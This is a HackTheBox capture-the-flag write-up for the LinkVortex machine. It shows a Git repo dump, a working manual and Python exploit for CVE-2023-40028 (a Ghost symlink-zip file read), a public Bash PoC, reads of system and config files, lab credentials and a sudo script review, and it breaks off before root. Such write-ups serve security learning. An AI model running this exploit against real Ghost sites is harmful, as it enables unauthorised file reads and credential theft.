---
title: HTB: LinkVortex
url: https://0xdf.gitlab.io/2025/04/12/htb-linkvortex.html
date: 2025-04-12T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: ctf, htb-linkvortex, hackthebox, nmap, subdomain, ffuf, ghost, git, gitdumper, apache, feroxbuster, cve-2023-40028, file-read, symbolic-link, youtube, python, python-zipfile, python-requests, netexec, toctou, apache-serversignature, apache-servertokens, oscp-like-v3, htb-unrested, htb-ghost
---

![LinkVortex](/img/linkvortex-cover.png)

LinkVortex is running an instance of Ghost for a blog. I’ll find a dev site with an exposed Git repo, and find credentials in it. These credentials allow me to exploit CVE-2023-40028, a file read vulnerability in Ghost abusing symbolic links in zip archives. I’ll exploit it manually and create a Python script to do it. To escalate to root, I’ll abuse a shell script with sudo. I’ll show three ways to exploit the script. In Beyond Root, I’ll look the Apache server directives that prevent the version information from being shared in the server string and on the 404 page.

## Box Info

| Name | [LinkVortex](https://hackthebox.com/machines/linkvortex)  [LinkVortex](https://hackthebox.com/machines/linkvortex) [Play on HackTheBox](https://hackthebox.com/machines/linkvortex) |
| --- | --- |
| Release Date | [07 Dec 2024](https://twitter.com/hackthebox_eu/status/1865081291047158091) |
| Retire Date | 12 Apr 2025 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for LinkVortex |
| Radar Graph | Radar chart for LinkVortex |
| First Blood User | 00:08:51[xct xct](https://app.hackthebox.com/users/13569) |
| First Blood Root | 00:17:03[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| Creator | [0xyassine 0xyassine](https://app.hackthebox.com/users/143843) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.47
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-07 13:17 UTC
Nmap scan report for 10.10.11.47
Host is up (0.095s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.86 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.47
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-07 13:18 UTC
Nmap scan report for 10.10.11.47
Host is up (0.092s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://linkvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.33 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 22.04 jammy. The Apache version is a bit weird. I would expect to see something like “Apache httpd 2.4.52 ((Ubuntu))” for jammy like on [Unrested](/2025/03/04/htb-unrested.html#nmap). The short answer is that Apache is configured with `SeverTokens Prod` and `ServerSignature Off`. I’ll show and explain this in [Beyond Root](#beyond-root---apache-config).

### Subdomain Fuzz

#### Brute Force

Port 80 returns a redirect to `linkvortex.htb`, so it must be using host-based routing. I’ll use `ffuf` to brute force for any subdomains of that domain that might respond differently:

```

oxdf@hacky$ ffuf -u http://10.10.11.47 -H "Host: FUZZ.linkvortex.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.47
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 94ms]
:: Progress: [19966/19966] :: Job [1/1] :: 430 req/sec :: Duration: [0:00:47] :: Errors: 0 ::

```

It finds `dev.linkvortex.htb`. I’ll add both to my `/etc/hosts` file:

```
10.10.11.47 linkvortex.htb dev.linkvortex.htb

```

#### nmap on linkvortex.htb

I’ll re-run `nmap` on the TCP 80 for each domain name. On `linkvortex.htb` it shows a `robots.txt` file:

```

oxdf@hacky$ nmap -p 80 -sCV linkvortex.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-07 14:59 UTC
Nmap scan report for linkvortex.htb (10.10.11.47)
Host is up (0.092s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-generator: Ghost 5.58
|_http-title: BitByBit Hardware
| http-robots.txt: 4 disallowed entries 
|_/ghost/ /p/ /email/ /r/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.31 seconds

```

`nmap` is finding that this is [Ghost](https://ghost.org/) (similar to the HTB [Ghost](/2025/04/05/htb-ghost.html#) machine last week), and the `robots.txt` file is the standard [Ghost CMS](https://github.com/TryGhost/Ghost/blob/v5.58.0/ghost/core/core/frontend/public/robots.txt) `robots.txt`. `/ghost` is the login page:

![image-20250407112148167](/img/image-20250407112148167.png)

The others return 404 Not Found.

#### nmap on dev.linkvortex.htb

The `nmap` on `dev.linkvortex.htb` finds a Git repo:

```

oxdf@hacky$ nmap -p 80 -sCV dev.linkvortex.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-07 15:04 UTC
Nmap scan report for dev.linkvortex.htb (10.10.11.47)
Host is up (0.092s latency).
rDNS record for 10.10.11.47: linkvortex.htb

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Launching Soon
| http-git: 
|   10.10.11.47:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|_      https://github.com/TryGhost/Ghost.git

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.94 seconds

```

Based on the remote, it seems to have been cloned from the [legit Ghost repo](https://github.com/TryGhost/Ghost.git).

### linkvortex.htb - TCP 80

#### Site

The site is for a site that talks about computer hardware:

![image-20250407105054978](/img/image-20250407105054978.png)

The the posts are by “admin”. The information in the posts seems to be just generic information about hardware. There’s nothing else really interesting here.

#### Tech Stack

The HTTP response headers show not only the slightly weird Apache header, but also ExpressJS:

```

HTTP/1.1 200 OK
Date: Mon, 07 Apr 2025 14:51:02 GMT
Server: Apache
X-Powered-By: Express
Cache-Control: public, max-age=0
Content-Type: text/html; charset=utf-8
ETag: W/"2f74-JxNFE2kxjbSyp56dTnXV2ZFbE3w"
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Length: 12148

```

The page footer shows that it is powered by Ghost, as already identified.

The 404 page is custom to the site:

![image-20250407110413771](/img/image-20250407110413771.png)

The directory brute force with `feroxbuster` finds a bunch of directories that all seem to have a generic wildcard response. I’ll kill it and come back later if I am stuck.

### dev.linkvortex.htb - TCP 80

#### Site

The site has a coming soon message:

![image-20250407110624412](/img/image-20250407110624412.png)

#### Tech Stack

The HTTP response headers for this site do not show Express like the other:

```

HTTP/1.1 200 OK
Date: Mon, 07 Apr 2025 15:08:05 GMT
Server: Apache
Last-Modified: Fri, 01 Nov 2024 08:22:52 GMT
ETag: "9ea-625d5a41f4118-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 2538
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

```

The Apache header is the same. The 404 is the same as the [default Apache 404](/cheatsheets/404#apache--httpd) except that the server and version information is not there:

![image-20250407110944782](/img/image-20250407110944782.png)

Typically there’s another line showing the Apache version and IP / port, but that is disabled (as I’ll show in [Beyond Root](#beyond-root---apache-config)).

#### Directory Brute Force

`feroxbuster` finds nothing on this site:

```

oxdf@hacky$ feroxbuster -u http://dev.linkvortex.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev.linkvortex.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       23w      196c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      115l      255w     2538c http://dev.linkvortex.htb/
[####################] - 57s    30000/30000   0s      found:1       errors:5      
[####################] - 57s    30000/30000   525/s   http://dev.linkvortex.htb/  

```

### Git Repo

#### Collect

`nmap` [identified](#nmap-on-devlinkvortexhtb) a Git repo on `dev.linkvortex.htb`. I’ll use [git-dumper](https://github.com/arthaud/git-dumper) to collect the repo:

```

oxdf@hacky$ mkdir source
oxdf@hacky$ git-dumper http://dev.linkvortex.htb source
[-] Testing http://dev.linkvortex.htb/.git/HEAD [200]
[-] Testing http://dev.linkvortex.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://dev.linkvortex.htb/.gitignore [404]
[-] http://dev.linkvortex.htb/.gitignore responded with status code 404
[-] Fetching http://dev.linkvortex.htb/.git/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/packed-refs [200]
[-] Fetching http://dev.linkvortex.htb/.git/description [200]
[-] Fetching http://dev.linkvortex.htb/.git/HEAD [200]
[-] Fetching http://dev.linkvortex.htb/.git/config [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/index [200]
[-] Fetching http://dev.linkvortex.htb/.git/logs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/shallow [200]
[-] Fetching http://dev.linkvortex.htb/.git/info/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/logs/HEAD [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/update.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/info/exclude [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/50/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/v5.57.3 [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/54b0ed7f9c9aedf3180ee1fd94e7e43b29f000 [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/50/864e0261278525197724b394ed4292414d9fec [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.idx [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.pack [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 5596 paths from the index

```

The contents of the ghost repo are now present in the `source` directory:

```

oxdf@hacky$ ls source/
apps  Dockerfile.ghost  ghost  LICENSE  nx.json  package.json  PRIVACY.md  README.md  SECURITY.md  yarn.lock

```

#### Changed Files

The repo is in a bit of an odd state:

```

oxdf@hacky$ git status 
Not currently on any branch.
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
        new file:   Dockerfile.ghost
        modified:   ghost/core/test/regression/api/admin/authentication.test.js

```

It is not currently in a branch, but it does have two modified files awaiting commit. I can see the diff in each of these using `git diff --cached`. The `Dockerfile.ghost` is completely new:

```

oxdf@hacky$ git diff --cached Dockerfile.ghost
diff --git a/Dockerfile.ghost b/Dockerfile.ghost
new file mode 100644
index 0000000..50864e0
--- /dev/null
+++ b/Dockerfile.ghost
@@ -0,0 +1,16 @@
+FROM ghost:5.58.0
+
+# Copy the config
+COPY config.production.json /var/lib/ghost/config.production.json
+
+# Prevent installing packages
+RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb
+
+# Wait for the db to be ready first
+COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
+COPY entry.sh /entry.sh
+RUN chmod +x /var/lib/ghost/wait-for-it.sh
+RUN chmod +x /entry.sh
+
+ENTRYPOINT ["/entry.sh"]
+CMD ["node", "current/index.js"]

```

This was likely created for LinkVortex. I’ll note that a config file is located at `/var/lib/ghost/config.production.json`.

The diff on `authentication.test.js` is a shows a password change:

```

oxdf@hacky$ git diff --cached ghost/core/test/regression/api/admin/authentication.test.js
diff --git a/ghost/core/test/regression/api/admin/authentication.test.js b/ghost/core/test/regression/api/admin/authentication.test.js
index 2735588..e654b0e 100644
--- a/ghost/core/test/regression/api/admin/authentication.test.js
+++ b/ghost/core/test/regression/api/admin/authentication.test.js
@@ -53,7 +53,7 @@ describe('Authentication API', function () {
 
         it('complete setup', async function () {
             const email = 'test@example.com';
-            const password = 'thisissupersafe';
+            const password = 'OctopiFociPilfer45';
 
             const requestMock = nock('https://api.github.com')
                 .get('/repos/tryghost/dawn/zipball')

```

This file is a unit test for the Ghost framework. That line is present in the [current Ghost code](https://github.com/TryGhost/Ghost/blob/e44c2117d150f89515f2ea1a7a620f6e678acace/ghost/core/test/regression/api/admin/authentication.test.js#L56) with the “thisissupersafe” password. The new password is likely useful.

#### Login

I’ll try these creds at `/ghost`, but they don’t work:

![image-20250407125153982](/img/image-20250407125153982.png)

I’ll try admin@linkvortex.htb with the same password, and it works!

![image-20250407125345793](/img/image-20250407125345793.png)

## Shell as bob

### Identify CVE-2023-40028

Knowing the Ghost version is 5.58, I’ll search for vulnerabilities in Ghost. Searching for this turns up a few potential options:

![image-20250407120644308](/img/image-20250407120644308.png)

CVE-2023-40028 shows up in several of these results.

### CVE-2023-40028 Background

[NIST describes](https://nvd.nist.gov/vuln/detail/CVE-2023-40028) CVE-2203-40028 as:

> Ghost is an open source content management system. Versions prior to 5.59.1 are subject to a vulnerability which allows authenticated users to upload files that are symlinks. This can be exploited to perform an arbitrary file read of any file on the host operating system. Site administrators can check for exploitation of this issue by looking for unknown symlinks within Ghost’s `content/` folder. Version 5.59.1 contains a fix for this issue. All users are advised to upgrade. There are no known workarounds for this vulnerability.

An authenticated user can upload symbolic link files that will allow for Ghost to access files outside of the “content” folder. The [patch to fix this issue](https://github.com/TryGhost/Ghost/commit/690fbf3f7302ff3f77159c0795928bdd20f41205) seems to be updatinge of [Ghost zip](https://www.npmjs.com/package/@tryghost/zip) node package:

![image-20250409130510799](/img/image-20250409130510799.png)

And adding a unit test to make sure zips with symlinks can’t be uploaded:

![image-20250407121650291](/img/image-20250407121650291.png)

The unit test shows a POST request with the Zip attachment to the API’s `/db` endpoint.

The `symlinks.zip` file is also included, which has a single file in it:

```

oxdf@hacky$ unzip -l symlinks.zip 
Archive:  symlinks.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        1  1980-01-01 00:00   content/images/malicious.jpg
---------                     -------
        1                     1 file

```

That file is just a symbolic link to `/`:

```

oxdf@hacky$ unzip symlinks.zip 
Archive:  symlinks.zip
    linking: content/images/malicious.jpg  -> / 
finishing deferred symbolic links:
  content/images/malicious.jpg -> /
oxdf@hacky$ ls -l content/images/malicious.jpg
lrwxrwxrwx 1 oxdf oxdf 1 Apr  7 16:24 content/images/malicious.jpg -> /

```

### Manual POC

#### Generate Zip

While there is a POC available (which I’ll look at in the [next section](#public-poc)), it’s a good exercise to see if I can build an exploit from what’s here. I’ll start by creating a new Zip file, with a symbolic link that points to `/etc/passwd`:

```

oxdf@hacky$ rm content/images/malicious.jpg
oxdf@hacky$ ln -s /etc/passwd content/images/0xdf.png
oxdf@hacky$ zip -y -r poc.zip content/images/
  adding: content/images/ (stored 0%)
  adding: content/images/0xdf.png (stored 0%)

```

`-y` tells `zip` to include symbolic links rather than go for the file / path.

#### Upload Zip

The [Ghost API docs](https://ghost.org/docs/admin-api/) show that the base URL for the Admin API is `/ghost/api/admin`. The endpoint here is therefore `/ghost/api/admin/db`. I’ll need to be authenticated. I’ll notice that in the browser dev tools I have a cookie for the admin page:

![image-20250407125427331](/img/image-20250407125427331.png)

I’ll also note in the unit test that the attachment is named `importfile`.

Putting that all together, I get:

```

oxdf@hacky$ curl http://linkvortex.htb/ghost/api/admin/db -F "importfile=@poc.zip" -b 'ghost-admin-api-session=s%3AbWhDHjQNa5JeU809QF2JPW6e4UEss2Em.g6N0Kedu5O7xKtx8RF30BBpoEO1OMgdIJ%2BazK7H6nWY' 
{"db":[],"problems":[]}

```

`-F` in `curl` is to attach a file, and the `@<filename>` syntax tells `curl` to take the contents of that file. `-b` is used to specify the cookie. It seems to have worked. Reading it returns `/etc/passwd`:

```

oxdf@hacky$ curl -b 'ghost-admin-api-session=s%3AbWhDHjQNa5JeU809QF2JPW6e4UEss2Em.g6N0Kedu5O7xKtx8RF30BBpoEO1OMgdIJ%2BazK7H6nWY' http://linkvortex.htb/content/images/0xdf.png
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash

```

### Script Exploit

#### Generate POC

This is a really nice beginner level exploit to develop based on what I demonstrated above. I’ll walk through the process in [this video](https://www.youtube.com/watch?v=pLgjI7gVwLc):

My final script is:

```

import io
import random
import requests
import string
import sys
import zipfile

# process inputs
if len(sys.argv) != 5:
    print(f"usage: {sys.argv[0]} <host> <username> <password> <file to read>")
    sys.exit()
hostname = sys.argv[1] if sys.argv[1].startswith('http') else f'http://{sys.argv[1]}'
username = sys.argv[2]
password = sys.argv[3]
target_file = sys.argv[4]

# create zip (in memory)
filename = ''.join(random.choices(string.ascii_letters, k=8)) + '.png'
file_path = f'content/images/{filename}'

zip_buffer = io.BytesIO()
with zipfile.ZipFile(zip_buffer, "w") as zip_file:
    zipInfo = zipfile.ZipInfo(file_path)
    zipInfo.create_system = 3 # UNIX
    zipInfo.external_attr |= 0xA0000000  # 0o120777 << 16
    zip_file.writestr(zipInfo, target_file)
zip_buffer.seek(0)

# login
sess = requests.session()
sess.post(
    f'{hostname}/ghost/api/admin/session',
    data={
        "username": username,
        "password": password
    }
)

# post to api
sess.post(
    f'{hostname}/ghost/api/admin/db/',
    files={'importfile': ('archive.zip', zip_buffer, 'application/zip')}
)

# read and display results
resp = requests.get(f'{hostname}/{file_path}')
if resp.status_code == 200:
    print(resp.text)
elif resp.status_code == 404:
    print(f'file not found: {target_file}')
elif resp.status_code == 500:
    print(f'unable to access: {target_file}')

```

It reads files:

```

oxdf@hacky$ python read.py linkvortex.htb admin@linkvortex.htb OctopiFociPilfer45 /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.20.0.2      e21648970fd9

oxdf@hacky$ python read.py linkvortex.htb admin@linkvortex.htb OctopiFociPilfer45 /etc/0xdf
file not found: /etc/0xdf
oxdf@hacky$ python read.py linkvortex.htb admin@linkvortex.htb OctopiFociPilfer45 /etc/shadow
unable to access: /etc/shadow

```

#### Public POC

There is a [POC](https://github.com/0xyassine/CVE-2023-40028) on GitHub that was present at the time of LinkVortex’s release, so I suspect most people used it. This POC exploits the vulnerability with a Bash script. I never used this, but it’s worth taking a quick look at how it works.

It starts by defining some locations:

```

#GHOST ENDPOINT
GHOST_URL='http://127.0.0.1'
GHOST_API="$GHOST_URL/ghost/api/v3/admin/"
API_VERSION='v3.0'

PAYLOAD_PATH="`dirname $0`/exploit"
PAYLOAD_ZIP_NAME=exploit.zip

```

It has a `generate_exploit` function that makes a Zip archive:

```

function generate_exploit()
{
  local FILE_TO_READ=$1
  IMAGE_NAME=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13; echo)
  mkdir -p $PAYLOAD_PATH/content/images/2024/
  ln -s $FILE_TO_READ $PAYLOAD_PATH/content/images/2024/$IMAGE_NAME.png
  zip -r -y $PAYLOAD_ZIP_NAME $PAYLOAD_PATH/ &>/dev/null
}

```

It’s generating a zip and saving it to the filesystem, similar to what I showed above. There’s another function, `send_exploit`, that will post the exploit:

```

function send_exploit()
{
  RES=$(curl -s -b cookie.txt \
  -H "Accept: text/plain, */*; q=0.01" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Accept-Encoding: gzip, deflate, br" \
  -H "X-Ghost-Version: 5.58" \
  -H "App-Pragma: no-cache" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Content-Type: multipart/form-data" \
  -X POST \
  -H "Origin: $GHOST_URL" \
  -H "Referer: $GHOST_URL/ghost/" \
  -F "importfile=@`dirname $PAYLOAD_PATH`/$PAYLOAD_ZIP_NAME;type=application/zip" \
  -H "form-data; name=\"importfile\"; filename=\"$PAYLOAD_ZIP_NAME\"" \
  -H "Content-Type: application/zip" \
  -J \
  "$GHOST_URL/ghost/api/v3/admin/db")
  if [ $? -ne 0 ];then
    echo "[!] FAILED TO SEND THE EXPLOIT"
    clean
    exit
  fi
}

```

It’s providing way more headers than are necessary.

The main body of the script is an infinite loop that takes in a file path, passes that to `generate_exploit`, then calls `send_exploit`, and then requests the same file to get the results. Finally, it calls `clean` (which deletes the files generated).

```

echo "WELCOME TO THE CVE-2023-40028 SHELL"
while true; do
  read -p "file> " INPUT
  if [[ $INPUT == "exit" ]]; then
    echo "Bye Bye !"
    break
  fi
  if [[ $INPUT =~ \  ]]; then
    echo "PLEASE ENTER FULL FILE PATH WITHOUT SPACE"
    continue
  fi
  if [ -z $INPUT  ]; then
    echo "VALUE REQUIRED"
    continue
  fi
  generate_exploit $INPUT
  send_exploit
  curl -b cookie.txt -s $GHOST_URL/content/images/2024/$IMAGE_NAME.png
  clean
done

rm cookie.txt

```

This works just fine.

### SSH as bob

#### Recover bob’s Password

[Earlier](#changed-files) the Git repo had the `Dockerfile` for running the Ghost container. One thing it did was copy the config file into the container:

```

# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json

```

That’s worth a read:

```

oxdf@hacky$ python read.py linkvortex.htb admin@linkvortex.htb OctopiFociPilfer45 /var/lib/ghost/config.production.json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}

```

At the bottom the SMTP setup has creds for bob@linkvortex.htb.

#### SSH

`netexec` shows these creds do work for SSH:

```

oxdf@hacky$ netexec ssh linkvortex.htb -u bob -p fibber-talented-worth
SSH         10.10.11.47     22     linkvortex.htb   [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
SSH         10.10.11.47     22     linkvortex.htb   [+] bob:fibber-talented-worth  Linux - Shell access!

```

I’ll connect:

```

oxdf@hacky$ sshpass -p fibber-talented-worth ssh bob@linkvortex.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)
...[snip]...
bob@linkvortex:~$ 

```
*Disclaimer - I like to use `sshpass` to pass passwords via the command line for CTF blog posts because it makes it very clear what I’m doing. Never enter real credentials into the command line like this.*

And read `user.txt`:

```

bob@linkvortex:~$ cat user.txt
f5f6a9f2************************

```

## Shell as root

### Enumeration

#### Users

bob’s home directory is very empty:

```

bob@linkvortex:~$ ls -la
total 28
drwxr-x--- 3 bob  bob  4096 Nov 30 10:07 .
drwxr-xr-x 3 root root 4096 Nov 30 10:07 ..
lrwxrwxrwx 1 root root    9 Apr  1  2024 .bash_history -> /dev/null
-rw-r--r-- 1 bob  bob   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 bob  bob  3771 Jan  6  2022 .bashrc
drwx------ 2 bob  bob  4096 Nov  1 08:40 .cache
-rw-r--r-- 1 bob  bob   807 Jan  6  2022 .profile
-rw-r----- 1 root bob    33 Dec  3 11:43 user.txt

```

There are no other non-root users with home directories in `/home` or shells on the box:

```

bob@linkvortex:/$ ls home/
bob
bob@linkvortex:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
bob:x:1001:1001::/home/bob:/bin/bash

```

#### sudo

bob can run a cleanup script as any user without a password using `sudo`:

```

bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png

```

Worth noting that the `CHECK_CONTENT` variable is kept in the environment when switching users.

### clean\_symlink.sh

The script is relatively short. It starts by defining some variables, initializing `CHECK_CONTENT` to false if it is not set, and making sure that the first input ends with “.png”:

```

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

```

The rest is a series of nested `if` statements:

```

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi

```

If the scanned file is not a link, it doesn’t do anything.

It checks the target of the link, and if it contains the string “etc” or “root”, it prints a warning and removes the link.

Otherwise, it moves the link file to the quarantine directory. If `CHECK_CONTENT` is true, then it prints the contents of the link.

### Exploit clean\_symlink.sh

#### Overview

There are three ways I’ve identified to exploit this script to read the contents of any file as root:

```

